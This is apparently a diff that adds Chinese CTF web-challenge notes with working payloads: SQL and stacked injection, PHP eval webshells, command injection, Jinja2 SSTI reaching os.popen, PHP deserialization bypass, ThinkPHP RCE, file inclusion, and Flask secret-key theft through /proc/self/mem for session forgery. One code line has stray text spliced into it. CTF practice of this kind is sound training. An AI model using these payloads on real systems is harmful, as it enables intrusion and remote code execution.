@@ -1,0 +1,420 @@
+-->> NewsCenter  字符串注入:
+# 获得所有数据库名
+search=' and 0 union select 1,2,group_concat(table_schema) from information_schema.schemata # 
+
+# 获取所有表名，以及表中的数据行数
+search=' and 0 union select 1,2,group_concat(table_name,'_',table_rows) from information_schema.tables
+ where table_schema=database() # 
+#  news_7, secret_table_1
+
+# 获取表 news 的字段名
+search=' and 0 union select 1,2,group_concat(column_name) from information_schema.columns
+ where table_name='news' # 
+# id,title,content
+
+# 获取表 secret_table 的字段名
+search=' and 0 union select 1,2,group_concat(column_name) from information_schema.columns
+ where table_name='secret_table' # 
+# id,fl4g
+
+# 获取flag
+search=' and 0 union select 1,2,fl4g from secret_table # 
+# QCTF{sq1_inJec7ion_ezzz}
+
+
+-->> upload1  图片头伪造上传:
+# 正常上传图片 image2.jpg
+upload/1677996651.image2.jpg  # 数字+文件名
+
+# 判断有前端JS 图片格式校验
+GIF89a  # jpg 图片头
+<?=eval($_REQUEST['angel']);?>  # 一句话shell
+
+# 蚁剑连接 获得flga
+<?php
+$flag="cyberpeace{7cbf837f817b6a15c10ff732dd67af38}";
+?>
+
+
+-->> XFF-Referer  请求IP伪造:
+# XFF  绕过IP地址检测，更改请求主机ip 
+X-Forwrded-For: 123.123.123.123
+
+# referer 从哪里来请求资源的
+Referer: https://www.google.com
+
+# 两个请求校验绕过，一般用于 图片、文章盗链等
+cyberpeace{e0872dbdd0dd16a19bbec1f88665ecc1}
+
+ 
+-->> ping 命令注入漏洞:
+# 不能写入shell，没有权限
+target=127.0.0.1;echo${IFS}'<?=eval($_REQUEST['angel']);?>'${IFS}>${IFS}shell.php
+
+# 翻目录 ${IFS}替换空格
+target=127.0.0.1;ls${IFS}-alh${IFS}../../
+
+# 得到flag
+target=127.0.0.1;cat${IFS}/home/flag.txt
+# cyberpeace{74bcc1b29e95daea28922ef456de4c83}
+
+
+-->> web2解密   逆向算法代码:
+# 加密函数
+$miwen = "a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";
+function encode($str)
+{
+    $string = strrev($str);
+    // echo $string;
+
+    $ecData = '';
+    for ($len = 0; $len < strlen($string); $len++) {
+
+        $subChrData = substr($string, $len, 1);
+        $ordData = ord($subChrData) + 1;
+        $subChrData = chr($ordData);
+        $ecData = $ecData . $subChrData;
+    }
+    return str_rot13(strrev(base64_encode($ecData)));
+}
+
+# 写出对应的逆向算法函数
+function decode($str)
+{
+    $string = base64_decode(strrev(str_rot13($str)));
+
+    $ecData = '';
+    for ($len = strlen($string); $len >= 0; $len--) {
+
+        $subChrData = substr($string, $len, 1);
+        $ordData = ord($subChrData) - 1;
+        $subChrData = chr($ordData);
+        $ecData = $ecData . $subChrData;
+    }
+
+    return strrev($ecData);
+}
+# flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}
+
+
+-->> wev_python_template_injection  Python模板注入:
+__class__ ： 返回对象所属的类
+__mro__ ： 返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。
+__base__ ： 返回该类所继承的基类 # __base__和__mro__都是用来寻找基类的
+__subclasses__ ： 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
+__init__ ： 类的初始化方法
+__globals__ ： 对包含函数全局变量的字典的引用
+
+# 得到变量的类是 str
+/{{''.__class__}}
+
+# 通过基类来找其中任意一个基类的引用列表
+/{{''.__class__.__mro__}}
+# <type 'str'>, <type 'basestring'>, <type 'object'>
+
+# 返回引用列表
+/{{''.__class__.__mro__[2].__subclasses__()}}
+
+# popen('ls')  执行系统命令
+/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
+# /fl4g index.py not found
+
+/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}
+#  /ctf{f22b6844-5169-4054-b2a0-d95b9361cb57} not found
+
+
+-->> Web_php_unserialize  PHP反序列化 + __wakeup()函数绕过  +  字符串检测绕过:
+<?php 
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) { 
+        $this->file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true); 
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') { 
+            //the secret is in the fl4g.php
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+if (isset($_GET['var'])) {  # 传参点
+    $var = base64_decode($_GET['var']);  # 需要进行base64编码 
+    if (preg_match('/[oc]:\d+:/i', $var)) {  # 字符串检测
+        # 检测 O:4:  C:4:   ，不区分大小写字母，O C字母 + 任意数字  
+        die('stop hacking!'); 
+    } else {
+        @unserialize($var);  
+    } 
+} else { 
+    highlight_file("index.php"); 
+} 
+?>
+
+# 将Demo类进行反序列化
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) { 
+        $this->file = $file; 
+    }
+
+    function __destruct() { 
+        echo @highlight_file($this->file, true); 
+    }
+
+    function __wakeup() { 
+        if ($this->file != 'index.php') { 
+            //the secret is in the fl4g.php
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+
+$data=new Demo("fl4g.php"); # 参数为flag文件
+$serData=serialize($data); # 反序列化
+echo $serData."\n"; #  O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
+
+$serData=str_replace("O:4","O:+4",$serData); # 绕过 字符串正则匹配 校验
+$serData=str_replace('Demo":1','Demo":2',$serData); # 反序列化后会调用__wakeup()，反序列化会调用，
+# 将变量数量 > 实际数量 即可绕过__wakeup()函数
+
+echo $serData."\n"; #  O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}
+$encodeData=base64_encode($serData); # base64 加密
+echo $encodeData;
+#  TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==
+
+GET /?var='TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=='
+# ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}
+
+
+-->> php_rce  PHP远程代码执行漏洞:
+# php 5.0版本漏洞
+# 调用 system() 函数执行 ls 命令
+GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=sys
+tem&vars[1][]=ls%20-l
+
+# getshell -1 ,调用 system() 函数执行 echo '<?=eval($_REQUEST["angel"]);?>' > shell.php 命令
+GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=sys
+tem&vars[1][]=echo+'<%3f%3deval($_REQUEST["angel"])%3b%3f>'+>+shell.php%20-l
+
+# getshell -2 ，调用 file_put_contents()函数,参数1 shell.php文件名，参数2 写入内容<?php phpinfo();?>
+s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&var
+s[1][]=shell.php&vars[1][1]=<?php phpinfo();?>
+
+# 蚁剑连接 获得flag
+
+# php 5.1版本漏洞
+#  system()  执行系统命令 ls
+?s=index/\think\Request/input&filter=system&data=['ls']
+
+# 写入shell文件
+?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
+# /write write()函数
+# cacheFile=shell.php  文件名
+# content=<?php phpinfo();?> 写入内容
+
+
+-->> web_php_include  input伪协议执行漏洞 + 大小写绕过字符串检测:
+# 文件包含
+<?php
+show_source(__FILE__);
+echo $_GET['hello'];
+$page=$_GET['page'];
+while (strstr($page, "php://")) { 
+    $page=str_replace("php://", "", $page); #  字符串检测
+}
+include($page);
+?>
+
+# 大小写绕过
+GET /?page=pHp://input
+
+# 执行有效载荷
+<?system('ls');?>
+
+<?=system('cat${IFS}fl4gisisish3r3.php');?>
+# 获得flag
+
+
+-->> supersqli   堆叠注入（输入多条命令，用 ; 隔开执行）:
+3' union select 1,2;--+  # 字符串检测
+# return preg_match("/select|update|delete|drop|insert|where|\./i",$inject)
+
+# 堆叠注入
+# 获得所有数据库
+GET /?inject=1';show databases;--+
+#  ctftraining information_schema mysql performance_schema supersqli test
+
+# 获得当前数据库下的所有表
+GET /?inject=1';show tables;--+
+#  1919810931114514 words
+ 
+# 获得 words 表中所有字段
+GET /?inject=1'%3bshow+columns+from+words%3b--%2b+
+#  id data
+
+# 获得 1919810931114514 表中所有字段,  数字名的表，需要用反引号 ` `
+GET /?inject=1'%3bshow+columns+from+`1919810931114514`%3b--%2b+
+#  flag
+
+# 默认查询是 words表，根据id字段判断
+GET /?inject=1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`;alter table 
+`words` change `flag` `id` varchar(100);--+
+
+rename tables `words` to `words1`;  #  步骤1 改成其他无关表
+rename tables `1919810931114514` to `words`;  #  步骤2 改成默认查询表 words
+alter table `words` change `flag` `id` varchar(100); #  步骤3 将表中flag字段 改成 默认sql查询语句中 id字段 
+
+# url编码的请求
+GET /?inject=1'%3brename+tables+`words`+to+`words1`%3brename+tables+`1919810931114514`+to+`words`%3balter+tabl
+e+`words`+change+`flag`+`id`+varchar(100)%3b--%2b
+
+GET /?inject=3' or 1=1 --+ # 获得flag
+#  flag{c168d583ed0d4d7196967b28cbd0b5e9}
+
+
+-->> warmup PHP校验绕过 + payload 2次编码:
+class emmm
+{
+    public static function checkFile(&$page)  # 校验函数
+    {
+        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
+        if (!isset($page) || !is_string($page)) { # 第一个if，判断page变量是否为空，是否是字符串
+            echo "you can't see it";
+            return false;
+        }
+
+        if (in_array($page, $whitelist)) { # 第二个if，判断传入的page是否在白名单中
+            return true;
+        }
+
+        $_page = mb_substr($page,0,mb_strpos($page . '?', '?'));
+        if (in_array($_page, $whitelist)) { # 第三个if，截取page？之前的字符赋给_page,判断_page是否在白名单中
+            return true;
+        }
+
+        $_page = urldecode($page);
+        $_page = mb_substr($_page,0,mb_strpos($_page . '?', '?'));
+        if (in_array($_page, $whitelist)) { # 第四个if，对page进行一次url解码并赋给_page，截取_page？之前的字符赋给_page,
+            return true; # 判断_page是否在白名单中，因此需要将？ 进行两个url编码
+        }
+
+        echo "you can't see it";
+        return false;
+    }
+}
+
+if (! empty($_REQUEST['file']) && is_string($_REQUEST['file']) && emmm::checkFile，查看启动本程序的历史命令($_REQUEST['file'])) {
+    include $_REQUEST['file'];
+    exit;
+} else {
+    echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
+}
+
+# payload
+/source.php?file=source.php%253F../../../../../ffffllllaaaagggg # ？ 进行两次url编码
+#  flag{25e7bce6005c4e0c983fb97297ac6e5a}
+
+
+-->> catcat-new  python服务器漏洞 + 程序内存查找和读取数据:
+# 查看访问url
+http://61.147.171.105:55205/info?file=Siamese.txt  #  文件包含特征
+
+# 尝试读取linux的固定文件，是否存在读取漏洞
+GET /info?file=../../../../etc/passwd
+#  b&# 39;root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/no
+#  login\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin
+
+# 查看服务器响应，得出pyhton服务器
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.2 Python/3.7.12  # 服务器信息
+Date: Thu, 09 Mar 2023 15:14:13 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 5383
+Connection: close
+
+# 读取linux目录，/proc/self/cmdline，查看启动本程序的历史命令
+GET /info?file=../../../../proc/self/cmdline
+# b&# 39;python\x00app.py\x00&# 39; #  \x00 空格
+# b'python app.py'
+
+# 读取app.py源码文件
+import os
+import uuid
+from flask import Flask, request, session, render_template, Markup
+from cat import cat
+
+flag = ""
+app = Flask(__name__,static_url_path='/', static_folder='static' )
+app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"
+if os.path.isfile("/flag"):
+    flag = cat("/flag")  # 读取flag到变量中
+    os.remove("/flag") # 删除flag文件，只能从内存中获取flag
+    
+@app.route('/', methods=['GET'])
+def index(): 
+    detailtxt = os.listdir('./details/') 
+    cats_list = [] 
+    for i in detailtxt: 
+        cats_list.append(i[:i.index('.')]) 
+        return render_template("index.html", cats_list=cats_list, cat=cat)
+        
+@app.route('/info', methods=["GET", 'POST'])
+def info(): 
+    filename = "./details/" + request.args.get('file', "") 
+    start = request.args.get('start', "0")
+    end = request.args.get('end', "0")
+    name = request.args.get('file', "")[:request.args.get('file', "").index('.')]
+    return render_template("detail.html", catname=name, info=cat(filename, start, end))
+
+@app.route('/admin', methods=["GET"])
+def admin_can_list_root():
+    if session.get('admin') == 1: # 这里伪造session=admin
+        return flag # 返回flag变量的值
+    else:
+        session['admin'] = 0
+        return "NoNoNo"
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', debug=False, port=5637)
+# 伪造会话需要知道 SECRET_KEY
+
+# 读取程序自身的所有内存数据
+/proc/self/mem  # 这里不能直接使用，可能会有数据不能读取，造成程序崩溃
+
+# 需要先查看程序的内存数据映射，然后读取指定区域的数据
+/proc/self/maps
+
+# 使用G:\Disk_F\web_code\python_script\python_session.py  查找/proc/self/maps + /proc/self/mem + SECRET_KEY
+Found rw addr: 94906603622400 - 94906603626496
+Found rw addr: 94906610884608 - 94906610900992
+Found rw addr: 140410347511808 - 140410347773952
+Found rw addr: 140410353070080 - 140410354171904
+Found rw addr: 140410354212864 - 140410354302976
+Found rw addr: 140410354315264 - 140410354626560
+Found rw addr: 140410354634752 - 140410355953664
+
+Secret Key: 79d71baffb274249852e30175a115757*abcdefgh
+
+# 拼接 session
+data = '{"admin":1}'
+# 伪造session
+headers = {
+    "Cookie" : "session=" + FSCM.encode(s_key, data)
+}
+flag = requests.get(url + "admin", headers=headers)
+
+# 请求url
+http://61.147.171.105:55205/admin
+
+# 获得flag
+catctf{Catch_the_c4t_HaHa}
+
+
+
+
+
+
+
